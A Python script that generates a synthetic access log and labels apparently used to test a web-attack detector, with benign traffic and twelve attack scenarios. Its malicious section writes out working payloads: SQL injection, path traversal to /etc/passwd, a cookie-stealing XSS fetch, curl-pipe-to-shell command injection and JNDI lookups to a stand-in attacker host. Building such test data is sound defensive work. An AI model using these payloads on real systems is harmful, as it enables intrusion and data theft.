#!/usr/bin/env python3
"""Generate the WATCHTOWER blind holdout set (holdout_access.log + holdout_labels.csv).

ALL DATA HERE IS FAKE. It is synthetic and exists only for detector evaluation.
Addresses are RFC 5737 / RFC 3849 documentation ranges only. No network I/O;
deterministic (random.Random(2026)). Written blind: the author never saw the
detection rules.

Site model: a mid-size web shop. URLs: /, /shop/category/<c>, /shop/item/<sku>,
/cart, /cart/add, /checkout, /account/login, /account/orders/<id>, /help/<topic>,
/help/search?q=, /api/v2/stock, /api/v2/auth/token, /api/v2/me, /static/...

MALICIOUS scenarios (label=malicious):
 scanner_wpscan        One IP, 250 requests in ~2 min, WordPress/CMS paths, nearly all 404, tool UA.
 secret_probe          curl, ~25 requests in under a minute for .env, .git, backups, keys, actuator.
 sqli_mixed            Several styles on one IP: boolean (mixed case, comment-obfuscated), UNION,
                       time-based (SLEEP / pg_sleep / WAITFOR), error-based (extractvalue), URL-encoded
                       and double-encoded, in different params (sku, id, term, sort).
 xss_probe             Script/svg/img/javascript:/attribute-breakout payloads in search and review params.
 traversal_probe       ../ in several encodings (%2f, %252e, ....//, backslash, %c0%af) against a download param.
 cmdi_probe            ; | $() backticks, %0a chained commands against a "ping/diagnostic" API param.
 jndi_probe            ${jndi:...} in query, User-Agent, Referer, with ${lower:} style obfuscation.
 stuffing_form         ~180 failed POST /account/login (401) from one IP over ~25 min, then a success (302).
 stuffing_api_json     ~120 POST /api/v2/auth/token returning HTTP 200 with a tiny error body (constant
                       size) -> failures only visible by response size; one differing size = success.
 slow_discovery        One request every ~4-6 min for all 12 hours: admin/backup/staging paths, mostly 404.
 ipv6_slash64_enum     40 addresses in 2001:db8:4a:7::/64, each 3-4 requests, sequential SKU / user-id
                       enumeration. Individually quiet; malicious only in aggregate.
 browser_ua_attacker   Normal Chrome UA and plausible referers throughout; IDOR enumeration of
                       /account/orders/<id> (403/404), hidden admin paths, a few injections, some real browsing.
BENIGN scenarios (label=benign), many being false-positive traps:
 shopper_v4 / shopper_v6  Ordinary sessions: pages, assets (200/304), cart, occasional 404.
 bulk_tabs_shopper     Opens ~30 item pages within seconds (tab burst).
 search_crawler        Googlebot-style crawler: robots, sitemap, many pages, some 404s, fast-ish.
 second_crawler        Slower bingbot-style crawler.
 uptime_monitor        /healthz every 60 s all day (720 near-identical requests).
 api_poller            Partner client polling /api/v2/stock every 10 s for stretches (200/304).
 webhook_partner       Payment provider POSTing /api/v2/webhooks/payments every few minutes.
 cgnat_mobile          One IP, 25 different mobile UAs, many users, includes some successful logins.
 dev_docs_reader       Help-search queries containing SQL keywords, quotes, pipes, ../, <script>, rm -rf
                       etc., all returning 200 with help-page referers (reading about security).
 typo_password_user    3-4 failed logins then success, then normal shopping.
 broken_images         One page whose 12 image links 404.
 security_employee     Lynx text browser UA, reads help pages, polite.
 rss_reader            Feed fetch hourly.
 link_preview_bot      Chat-app link unfurler fetching a couple of item pages.
 password_reset_user   Forgot password flow: POST reset, a few 4xx, then login.
"""
import csv, ipaddress, os, random, urllib.parse
from datetime import datetime, timedelta, timezone

R = random.Random(2026)
START = datetime(2026, 11, 10, 0, 0, 0, tzinfo=timezone.utc)
SPAN = 12 * 3600
HERE = os.path.dirname(os.path.abspath(__file__))
DOC_NETS = [ipaddress.ip_network(n) for n in
            ("192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24", "2001:db8::/32")]

LINES = []   # (t, seq, text)
LABELS = {}  # ip -> (label, scenario)
HOST = "https://shop.example.com"

CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
UAS = [
    CHROME,
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
]
CATS = ["shoes", "jackets", "bags", "watches", "kitchen", "garden", "toys", "audio"]
SKUS = ["SKU%05d" % n for n in range(10100, 10400)]


def reg(ip, label, scen):
    assert any(ipaddress.ip_address(ip) in n for n in DOC_NETS), ip
    assert ip not in LABELS, "dup " + ip
    LABELS[ip] = (label, scen)


def emit(ip, t, method, path, status, size, ref="-", ua="-"):
    assert ip in LABELS, ip
    t = max(0, min(SPAN - 1, int(t)))
    ts = (START + timedelta(seconds=t)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    LINES.append((t, len(LINES),
                  '%s - - [%s] "%s %s HTTP/1.1" %d %d "%s" "%s"' % (ip, ts, method, path, status, size, ref, ua)))


def q(s, safe=""):
    return urllib.parse.quote(s, safe=safe)


def v4(net, host):
    return "%s.%d" % (net, host)


# ------------------------------------------------------------------ benign
ASSETS = ["/static/css/main.css", "/static/js/bundle.js", "/static/img/logo.svg", "/static/img/banner.webp"]


def page(ip, t, path, ua, ref="-", status=200):
    emit(ip, t, "GET", path, status, R.randint(900, 24000) if status == 200 else 0, ref, ua)
    for i, a in enumerate(R.sample(ASSETS, R.randint(1, 4))):
        st = R.choice([200, 304, 304])
        emit(ip, t + i // 2, "GET", a, st, R.randint(2000, 90000) if st == 200 else 0, HOST + path, ua)


def shopper(ip, scen, start, ua=None, pages=None):
    ua = ua or R.choice(UAS)
    t, prev = start, "https://www.google.com/"
    n = pages or R.randint(4, 14)
    cat = R.choice(CATS)
    seq = ["/", "/shop/category/" + cat]
    for _ in range(n):
        seq.append("/shop/item/" + R.choice(SKUS))
    if R.random() < .6:
        seq += ["/cart", "/checkout"]
    for p in seq:
        page(ip, t, p, ua, prev)
        if p == "/cart" and R.random() < .8:
            emit(ip, t + 5, "POST", "/cart/add", 302, 0, HOST + p, ua)
        if R.random() < .06:
            emit(ip, t + 2, "GET", "/static/img/promo-old.png", 404, 162, HOST + p, ua)
        prev = HOST + p
        t += R.randint(6, 90)
    return t


def build_benign():
    # ordinary shoppers
    v4s = [v4("192.0.2", h) for h in range(10, 24)] + [v4("198.51.100", h) for h in range(100, 108)]
    for ip in v4s:
        reg(ip, "benign", "shopper_v4")
        shopper(ip, "s", R.randint(0, SPAN - 1500))
    for k in range(6):
        ip = "2001:db8:1c%02x::%x" % (k, R.randint(1, 0xfff))
        reg(ip, "benign", "shopper_v6")
        shopper(ip, "s", R.randint(0, SPAN - 1500))
    # tab burst
    ip = "192.0.2.60"; reg(ip, "benign", "bulk_tabs_shopper")
    t = 15000; ua = UAS[0]
    page(ip, t, "/shop/category/audio", ua, "https://www.google.com/")
    for i in range(30):
        emit(ip, t + 3 + i // 6, "GET", "/shop/item/" + R.choice(SKUS), 200, R.randint(4000, 9000), HOST + "/shop/category/audio", ua)
    # crawlers
    ip = "198.51.100.77"; reg(ip, "benign", "search_crawler")
    ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    emit(ip, 1200, "GET", "/robots.txt", 200, 310, "-", ua)
    emit(ip, 1201, "GET", "/sitemap.xml", 200, 20400, "-", ua)
    t = 1203
    for s in R.sample(SKUS, 120):
        st = 200 if R.random() < .93 else 404
        emit(ip, t, "GET", "/shop/item/" + s, st, R.randint(4000, 9000) if st == 200 else 162, "-", ua); t += R.randint(1, 4)
    for c in CATS:
        emit(ip, t, "GET", "/shop/category/" + c, 200, 15000, "-", ua); t += 2
    ip = "203.0.113.200"; reg(ip, "benign", "second_crawler")
    ua = "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    emit(ip, 30000, "GET", "/robots.txt", 200, 310, "-", ua)
    t = 30010
    for s in R.sample(SKUS, 40):
        emit(ip, t, "GET", "/shop/item/" + s, 200, R.randint(4000, 9000), "-", ua); t += R.randint(20, 90)
    # uptime monitor
    ip = "198.51.100.5"; reg(ip, "benign", "uptime_monitor")
    for t in range(7, SPAN, 60):
        emit(ip, t, "GET", "/healthz", 200, 17, "-", "Pingdom.com_bot_version_1.4_(http://www.pingdom.com/)")
    # API poller
    ip = "203.0.113.45"; reg(ip, "benign", "api_poller")
    ua = "stockwatch-client/3.2 (python-requests/2.31.0)"
    for (a, b) in [(3600, 7200), (21600, 25200), (36000, 39000)]:
        for t in range(a, b, 10):
            st = R.choice([200, 200, 200, 304])
            emit(ip, t + R.randint(0, 1), "GET", "/api/v2/stock?sku=SKU10234", st, 58 if st == 200 else 0, "-", ua)
    # webhook partner
    ip = "192.0.2.150"; reg(ip, "benign", "webhook_partner")
    for t in range(100, SPAN, R.randint(200, 400)):
        emit(ip, t, "POST", "/api/v2/webhooks/payments", 200, 12, "-", "PayGate-Webhook/2.0")
    # CGNAT mobile
    ip = "198.51.100.33"; reg(ip, "benign", "cgnat_mobile")
    mobile = []
    for i in range(25):
        a = R.choice([14, 15, 16, 17])
        mobile.append(R.choice([
            "Mozilla/5.0 (iPhone; CPU iPhone OS %d_%d like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%d.%d Mobile/15E148 Safari/604.1" % (a, R.randint(0, 6), a, R.randint(0, 6)),
            "Mozilla/5.0 (Linux; Android %d; Pixel %d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Mobile Safari/537.36" % (R.randint(11, 14), R.randint(4, 8), R.randint(118, 130)),
            "ShopApp/5.%d (Android %d; SM-A%d)" % (R.randint(0, 9), R.randint(10, 14), R.randint(100, 560)),
            "ShopApp/5.%d (iOS %d.%d; iPhone%d,%d)" % (R.randint(0, 9), R.randint(15, 17), R.randint(0, 5), R.randint(11, 15), R.randint(1, 8)),
        ]) + " ")
    mobile = [m.strip() + ("" if i < 5 else "") for i, m in enumerate(mobile)]
    mobile = list(dict.fromkeys(mobile))
    for u in mobile:
        s = R.randint(0, SPAN - 900)
        end = shopper(ip, "s", s, ua=u, pages=R.randint(2, 5))
        if R.random() < .4:
            emit(ip, s + 20, "POST", "/account/login", 302, 0, HOST + "/account/login", u)
    # dev reading docs
    ip = "203.0.113.88"; reg(ip, "benign", "dev_docs_reader")
    ua = UAS[2]; t = 20000
    queries = ["SELECT * FROM orders WHERE id = 1", "difference between UNION and JOIN in sql", "what does ' OR '1'='1 mean",
               "export orders | grep refund | wc -l", "cat access.log | awk '{print $1}'", "../ relative path import", "how to escape <script> tags in templates",
               "rm -rf node_modules explained", "DROP TABLE vs TRUNCATE", "bash $(date) substitution", "api key \"quoted\" header", "sleep(5) vs setTimeout",
               "cart export --format=csv; echo done"]
    page(ip, t, "/help/developers", ua, "https://www.google.com/")
    for qq in queries:
        t += R.randint(15, 70)
        emit(ip, t, "GET", "/help/search?q=" + q(qq, "'*()"), 200, R.randint(3000, 8000), HOST + "/help/developers", ua)
        if R.random() < .5:
            t += 10; emit(ip, t, "GET", "/help/" + R.choice(["api-guide", "export-orders", "webhooks", "faq-security"]), 200, 6000, HOST + "/help/search", ua)
    # typo password
    ip = "192.0.2.77"; reg(ip, "benign", "typo_password_user")
    ua = UAS[1]; t = 9000
    page(ip, t, "/account/login", ua, "https://shop.example.com/"); t += 14
    for i in range(R.choice([3, 4])):
        emit(ip, t, "POST", "/account/login", 401, 1180, HOST + "/account/login", ua); t += R.randint(8, 20)
    emit(ip, t, "POST", "/account/login", 302, 0, HOST + "/account/login", ua)
    page(ip, t + 2, "/account/orders", ua, HOST + "/account/login")
    shopper(ip, "s", t + 40, ua=ua, pages=4)
    # broken images
    ip = "198.51.100.140"; reg(ip, "benign", "broken_images")
    ua = UAS[4]; t = 33000
    page(ip, t, "/shop/item/SKU10311", ua, "https://www.google.com/")
    for i in range(12):
        emit(ip, t + 1, "GET", "/static/img/items/SKU10311/gallery-%02d.jpg" % i, 404, 162, HOST + "/shop/item/SKU10311", ua)
    # security-conscious employee
    ip = "203.0.113.130"; reg(ip, "benign", "security_employee")
    ua = "Lynx/2.9.0dev.12 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/3.7.9"; t = 41000
    for p in ["/", "/help/privacy", "/help/faq-security", "/help/contact", "/shop/category/audio", "/shop/item/SKU10150"]:
        emit(ip, t, "GET", p, 200, R.randint(2000, 9000), "-", ua); t += R.randint(30, 120)
    # rss, unfurler, reset
    ip = "192.0.2.180"; reg(ip, "benign", "rss_reader")
    for t in range(300, SPAN, 3600):
        emit(ip, t + R.randint(0, 20), "GET", "/blog-feed.xml", R.choice([200, 304]), 8800, "-", "Feedly/1.0 (+http://www.feedly.com/fetcher.html)")
    ip = "2001:db8:5e::25"; reg(ip, "benign", "link_preview_bot")
    for t, s in [(18000, "SKU10200"), (18002, "SKU10201")]:
        emit(ip, t, "GET", "/shop/item/" + s, 200, 7000, "-", "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)")
    ip = "198.51.100.210"; reg(ip, "benign", "password_reset_user")
    ua = UAS[3]; t = 26000
    page(ip, t, "/account/login", ua, "-")
    emit(ip, t + 20, "POST", "/account/login", 401, 1180, HOST + "/account/login", ua)
    page(ip, t + 40, "/account/password/reset", ua, HOST + "/account/login")
    emit(ip, t + 70, "POST", "/account/password/reset", 202, 0, HOST + "/account/password/reset", ua)
    emit(ip, t + 600, "GET", "/account/password/reset/confirm?token=" + "".join(R.choice("abcdef0123456789") for _ in range(32)), 200, 3100, "-", ua)
    emit(ip, t + 640, "POST", "/account/password/reset/confirm", 302, 0, HOST + "/account/password/reset/confirm", ua)
    emit(ip, t + 660, "POST", "/account/login", 302, 0, HOST + "/account/login", ua)


# --------------------------------------------------------------- malicious
def build_malicious():
    # 1 scanner
    ip = "203.0.113.17"; reg(ip, "malicious", "scanner_wpscan")
    ua = "WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)"
    paths = ["/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/wp-json/wp/v2/users", "/wp-config.php", "/phpmyadmin/", "/pma/", "/administrator/", "/cgi-bin/test.cgi", "/joomla/", "/typo3/", "/solr/admin/", "/manager/html", "/console/", "/user/login", "/xampp/"]
    paths += ["/wp-content/plugins/%s/readme.txt" % p for p in "akismet elementor contact-form-7 revslider duplicator wp-file-manager".split()]
    paths += ["/wp-content/themes/%s/style.css" % p for p in "twentyfifteen astra divi avada".split()]
    t = 5400
    for i in range(250):
        p = paths[i % len(paths)] + ("" if i < len(paths) else "?%d" % i)
        emit(ip, t, "GET", p, R.choice([404] * 9 + [403]), 162, "-", ua); t += R.choice([0, 0, 1])
    # 2 secret probe
    ip = "203.0.113.23"; reg(ip, "malicious", "secret_probe")
    ua = "curl/8.4.0"; t = 12000
    for p in ["/.env", "/.env.production", "/.git/config", "/.git/HEAD", "/backup.sql", "/db.sql.gz", "/config.php.bak", "/.aws/credentials", "/id_rsa", "/.ssh/id_rsa", "/server-status", "/actuator/env", "/actuator/heapdump", "/.htpasswd", "/web.config", "/application.yml", "/docker-compose.yml", "/.DS_Store", "/wp-config.php~", "/storage/logs/laravel.log", "/.npmrc", "/phpinfo.php", "/site.tar.gz", "/api/v2/../../.env", "/.svn/entries"]:
        st = 404; sz = 162
        if p == "/.git/HEAD": st, sz = 200, 23
        if p == "/.htpasswd": st, sz = 403, 199
        emit(ip, t, "GET", p, st, sz, "-", ua); t += R.choice([1, 1, 2])
    # 3 sqli
    ip = "203.0.113.31"; reg(ip, "malicious", "sqli_mixed")
    ua = "Mozilla/5.0 (compatible; sqlmap/1.7.11#stable; https://sqlmap.org)"; t = 22000
    pl = [
        "/shop/item?sku=" + q("10234' oR '1'='1"),
        "/shop/item?sku=" + q("10234'/**/AnD/**/1=1--+-", "/*"),
        "/shop/search?term=" + q("x') UnIoN aLl SeLeCt NULL,username,password,NULL FrOm users-- -", "'"),
        "/api/v2/orders?id=" + q("1 AND (SELECT 7 FROM (SELECT SLEEP(6))a)"),
        "/api/v2/orders?id=" + q("1;SELECT pg_sleep(6)--"),
        "/shop/category/shoes?sort=" + q("price;WAITFOR DELAY '0:0:5'--"),
        "/shop/item?sku=" + q("1 AND extractvalue(1,concat(0x7e,(select @@version)))"),
        "/shop/search?term=%2527%2520OR%25201%253D1%2523",
        "/shop/search?term=%27%29%29%20%6fr%20%31%3d%31%20%2d%2d%20",
        "/api/v2/orders?id=-1%20UNION%20SELECT%201,table_name,3%20FROM%20information_schema.tables",
        "/shop/item?sku=" + q("10234' AND 1=CAST((SELECT current_user) AS int)--", "'"),
        "/shop/item?sku=" + q("10234\" || (SELECT 1 FROM dual WHERE 1=1) || \""),
        "/api/v2/stock?sku=" + q("a' OR EXISTS(SELECT * FROM users WHERE name LIKE 'adm%')#"),
        "/shop/search?term=" + q("1' ORDER BY 9-- "),
    ]
    for p in pl:
        emit(ip, t, "GET", p, R.choice([500, 500, 200, 400]), R.randint(200, 3000), "-", ua); t += R.randint(1, 9)
    # 4 xss
    ip = "198.51.100.61"; reg(ip, "malicious", "xss_probe")
    ua = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"; t = 28000
    pl = ["/shop/search?term=" + q("<ScRiPt>alert(document.domain)</sCrIpT>", "<>()"),
          "/shop/search?term=" + q("\"><svg/onload=confirm(1)>", "<>/=()"),
          "/help/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
          "/shop/item/SKU10120/reviews?text=" + q("<iframe src=javascript:alert(1)>"),
          "/shop/search?term=" + q("'-alert(1)-'"),
          "/account/profile?name=" + q("\" autofocus onfocus=alert(1) x=\""),
          "/shop/search?term=%u003cscript%u003ealert(1)%u003c/script%u003e",
          "/help/search?q=" + q("<details open ontoggle=prompt(1)>", "<>=()"),
          "/shop/search?term=" + q("<body onpageshow=fetch('//203.0.113.9/c?'+document.cookie)>", "<>=()'/+?.")]
    for p in pl:
        emit(ip, t, "GET", p, 200, R.randint(3000, 9000), "-", ua); t += R.randint(3, 25)
    # 5 traversal
    ip = "203.0.113.52"; reg(ip, "malicious", "traversal_probe")
    ua = "python-requests/2.28.1"; t = 8000
    for f in ["..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd", "%252e%252e%252f%252e%252e%252fetc%252fshadow",
              "..\\..\\..\\windows\\win.ini", "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts", "/etc/passwd", "../../../../proc/self/environ",
              "..%5c..%5c..%5cboot.ini", "invoices/../../../../var/www/.env", "file:///etc/passwd"]:
        emit(ip, t, "GET", "/help/download?file=" + (f if "%" in f else q(f, "/")), R.choice([400, 404, 403]), 180, "-", ua); t += R.randint(1, 6)
    # 6 cmdi
    ip = "198.51.100.88"; reg(ip, "malicious", "cmdi_probe")
    ua = "Go-http-client/1.1"; t = 35000
    for h in ["127.0.0.1;id", "127.0.0.1|cat /etc/passwd", "$(whoami).attacker.invalid", "`uname -a`", "x%0acurl http://203.0.113.9/s.sh|sh",
              "127.0.0.1 && wget -qO- 203.0.113.9/a", "|| nslookup $(hostname).oob.invalid", "127.0.0.1;sleep 7", "a;/bin/sh -c 'id'"]:
        emit(ip, t, "GET", "/api/v2/tools/ping?host=" + (h if "%0a" in h else q(h, "|;$()`&")), R.choice([200, 500]), R.randint(60, 400), "-", ua); t += R.randint(2, 15)
    # 7 jndi
    ip = "203.0.113.64"; reg(ip, "malicious", "jndi_probe")
    t = 16000; norm = CHROME
    emit(ip, t, "GET", "/shop/search?term=" + q("${jndi:ldap://203.0.113.9:1389/a}", "{}$:/"), 200, 5000, "-", norm)
    emit(ip, t + 3, "GET", "/", 200, 9000, "-", "${jndi:ldap://203.0.113.9:1389/ua}")
    emit(ip, t + 6, "GET", "/", 200, 9000, "${jndi:dns://x.oob.invalid/r}", norm)
    emit(ip, t + 9, "GET", "/api/v2/stock?sku=" + q("${${lower:j}ndi:${lower:l}dap://203.0.113.9/b}", "{}$:/"), 400, 90, "-", norm)
    emit(ip, t + 12, "GET", "/shop/item/" + q("${${::-j}${::-n}${::-d}${::-i}:rmi://203.0.113.9/c}", "{}$:/-"), 404, 162, "-", norm)
    emit(ip, t + 15, "GET", "/help/search?q=" + q("${jnDi:${env:NaN:-l}dap://203.0.113.9:1389/Basic/Command}", "{}$:/-"), 200, 4000, "-", "Mozilla/5.0 ${jndi:ldap://203.0.113.9/x}")
    # 8 stuffing form
    ip = "203.0.113.71"; reg(ip, "malicious", "stuffing_form")
    ua = "okhttp/4.9.3"; t = 3000
    for i in range(180):
        win = i in (141,)
        emit(ip, t, "POST", "/account/login", 302 if win else 401, 0 if win else 1180, HOST + "/account/login", ua)
        if win:
            emit(ip, t + 1, "GET", "/account/orders", 200, 7800, HOST + "/account/login", ua)
        t += R.choice([7, 8, 9, 8])
    # 9 stuffing api json, 200 + error body
    ip = "198.51.100.99"; reg(ip, "malicious", "stuffing_api_json")
    t = 38000
    for i in range(120):
        win = i == 97
        ua = R.choice(UAS) if i % 3 else "PostmanRuntime/7.37.0"
        emit(ip, t, "POST", "/api/v2/auth/token", 200, 387 if win else 41, "-", ua)
        if win:
            emit(ip, t + 1, "GET", "/api/v2/me", 200, 212, "-", ua)
        t += R.choice([4, 5, 5, 6])
    # 10 slow discovery
    ip = "192.0.2.201"; reg(ip, "malicious", "slow_discovery")
    ua = "python-httpx/0.27.0"
    words = ["admin", "administrator", "backup", "backups", "old", "staging", "dev", "test", "private", "internal", "upload", "uploads", "dashboard", "manage", "console", "api/v1", "api/v2/admin", "debug", "tmp", "dump", "export", "reports", "login.php", "admin.php", "config", "conf", "data", "db", "sql", "shop/admin", "shop/old", "cgi-bin", "invoices", "staff", "vpn", "git", "svn", "beta", "v1", "shop/backup"]
    t = 600; i = 0
    while t < SPAN:
        w = words[i % len(words)] + ("" if i < len(words) else R.choice(["/", ".zip", ".bak", "/index"]))
        emit(ip, t, "GET", "/" + w, R.choice([404] * 8 + [403, 301]), 162, "-", ua)
        i += 1; t += R.randint(220, 380)
    # 11 ipv6 /64 spread
    uid = 1000; sku = 10100
    for k in range(40):
        ip = "2001:db8:4a:7:%x:%x:%x:%x" % (R.randint(1, 0xffff), R.randint(0, 0xffff), R.randint(0, 0xffff), R.randint(1, 0xffff))
        reg(ip, "malicious", "ipv6_slash64_enum")
        t = 10000 + k * 600 + R.randint(0, 200)
        for _ in range(R.choice([3, 3, 4])):
            if R.random() < .5:
                p = "/shop/item/SKU%05d" % sku; sku += 1; st = R.choice([200, 404])
            else:
                p = "/api/v2/users/%d" % uid; uid += 1; st = R.choice([401, 403, 404])
            emit(ip, t, "GET", p, st, R.randint(100, 5000) if st == 200 else 90, "-", "Mozilla/5.0 (compatible; research-crawler/0.3)")
            t += R.randint(5, 40)
    # 12 browser-UA attacker
    ip = "198.51.100.173"; reg(ip, "malicious", "browser_ua_attacker")
    ua = CHROME; t = 19000; ref = "https://www.google.com/"
    page(ip, t, "/", ua, ref); t += 20
    for i in range(1, 36):
        emit(ip, t, "GET", "/account/orders/%d" % (48000 + i), R.choice([403, 403, 404]), 199, HOST + "/account/orders/%d" % (48000 + i - 1) if i > 1 else HOST + "/", ua)
        t += R.randint(10, 60)
        if i % 7 == 0:
            page(ip, t, "/shop/item/" + R.choice(SKUS), ua, HOST + "/"); t += 15
        if i == 9:
            emit(ip, t, "GET", "/shop/item/SKU10150" + q("' AND 1=2 UNION SELECT card_no,2 FROM payments--", "'"), 500, 410, HOST + "/shop/item/SKU10150", ua); t += 30
        if i == 15:
            for p in ["/admin", "/admin/users", "/.git/HEAD", "/internal/metrics"]:
                emit(ip, t, "GET", p, 404, 162, HOST + "/", ua); t += R.randint(20, 50)
        if i == 25:
            emit(ip, t, "GET", "/help/download?file=" + q("../../config/database.yml", "/"), 400, 120, HOST + "/help/shipping", ua); t += 40


build_benign()
build_malicious()
LINES.sort(key=lambda x: (x[0], x[1]))
with open(os.path.join(HERE, "holdout_access.log"), "w") as f:
    for _, _, s in LINES:
        f.write(s + "\n")
seen = {l[2].split(" ", 1)[0] for l in LINES}
assert seen <= set(LABELS), seen - set(LABELS)
with open(os.path.join(HERE, "holdout_labels.csv"), "w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["client_ip", "label", "scenario"])
    for ip in sorted(seen):
        w.writerow([ip] + list(LABELS[ip]))
print(len(LINES), "lines;", len(seen), "clients")
